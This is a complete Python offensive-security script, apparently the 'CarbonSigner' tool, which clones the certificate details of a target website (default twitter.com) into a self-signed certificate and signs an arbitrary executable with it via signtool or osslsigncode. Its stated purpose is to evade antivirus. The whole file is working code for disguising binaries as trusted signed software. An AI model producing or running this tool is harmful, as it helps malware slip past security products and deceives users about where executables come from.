#!/usr/bin/python3

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Spoofs SSL Certificates and Signs executables to evade Antivirus


from OpenSSL import crypto
from sys import argv, platform
from pathlib import Path
import argparse
import shutil
import ssl
import os
import subprocess

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

def CarbonCopy(host, port, signee, signed):

    try:
        #Fetching Details
        print("[+] Loading public key of %s in Memory..." % host)
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        #Creating Fake Certificate
        CNCRT   = certDir / (host + ".crt")
        CNKEY   = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        #Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        #Setting Cert details from loaded from the original Certificate
        print("[+] Cloning Certificate Version")
        cert.set_version(x509.get_version())
        print("[+] Cloning Certificate Serial Number")
        cert.set_serial_number(x509.get_serial_number())
        print("[+] Cloning Certificate Subject")
        cert.set_subject(x509.get_subject())
        print("[+] Cloning Certificate Issuer")
        cert.set_issuer(x509.get_issuer())
        print("[+] Cloning Certificate Registration & Expiration Dates")
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        print("[+] Signing Keys")
        cert.sign(k, 'sha256')

        print("[+] Creating %s and %s" %(CNCRT, CNKEY))
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
        print("[+] Clone process completed. Creating PFX file for signing executable...")

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)
        print("[+] Print content: ")
        print("Version:{}".format(cert.get_version()))
        print("Serial Number: {}".format(cert.get_serial_number()))
        print("Subject: {}".format(cert.get_subject()))
        print("Issuer: {}".format(cert.get_issuer()))
        print("Not before: {}".format(cert.get_notBefore()))
        print("Not after: {}".format(cert.get_notAfter()))
        print(signee,signed)
        if not(signee == "" or signed == ""):
            if platform == "win32":
                print("[+] Platform is Windows OS...")
                print("[+] Signing %s with signtool.exe..." %(signed))
                shutil.copy(signee, signed)
                subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
                    "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
                    "/td", "SHA256", "/fd", "SHA256", signed])

            else:
                print("[+] Platform is Linux OS...")
                print("[+] Signing %s with %s using osslsigncode..." %(signee, PFXFILE))
                args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
                        "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
                        "-in", signee, "-out", signed)
                print("[+] ", end='', flush=True)
                subprocess.check_call(args)
                print("[+] Verify binary {} ... ".format)
                args = ("osslsigncode", "verify",signed)
                print("", end='', flush=True)
                subprocess.check_call(args)
        else:
            print("[+] No binary specify, leaving.")
    except Exception as ex:
        print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))

def main():
    print(""" +-+-+-+-+-+-+-+-+-+-+-+-+
 |C|a|r|b|o|n|S|i|g|n|e|r|
 +-+-+-+-+-+-+-+-+-+-+-+-+

  CarbonSigner v1.0\n  Author: Paranoid Ninja\n""")
    parser = argparse.ArgumentParser(description=" Impersonates the Certificate of a website")
    parser.add_argument('-t', '--target', type=str, default="www.twitter.com", help="Target")
    parser.add_argument('-p', '--port', type=str, default="443", help="Port")
    parser.add_argument('-e', '--executable', type=str, help="Build executable")
    parser.add_argument('-o', '--output', type=str, help="Output file for signed executable")
    args = parser.parse_args()
    CarbonCopy(args.target, args.port, args.executable, args.output)
if __name__ == "__main__":
    main()
